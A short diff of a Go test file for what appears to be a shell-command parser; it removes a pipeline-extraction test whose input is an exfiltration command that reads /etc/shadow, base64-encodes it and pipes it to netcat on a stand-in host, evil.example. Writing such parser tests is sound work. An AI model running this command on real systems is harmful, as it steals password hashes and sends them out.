@@ -136,19 +136,6 @@ func TestExtractFilenames(t *testing.T) {
 	}
 }
 
-func TestExtractPipelines(t *testing.T) {
-
-	got := ExtractPipelines(args("command", "cat /etc/shadow | base64 | nc evil.example 1234"))
-	for _, want := range []string{"base64", "nc"} {
-		if !hasSuffix(got, want) && !has(got, want) {
-			joined := strings.Join(got, " | ")
-			if !strings.Contains(joined, want) {
-				t.Errorf("pipeline stage %q is missing from %v", want, got)
-			}
-		}
-	}
-}
-
 func TestLooksLikeFilename(t *testing.T) {
 	yes := []string{"a.txt", ".env", "Makefile", "id_rsa", "docker" + "file", "x.tar.gz"}
 	for _, s := range yes {
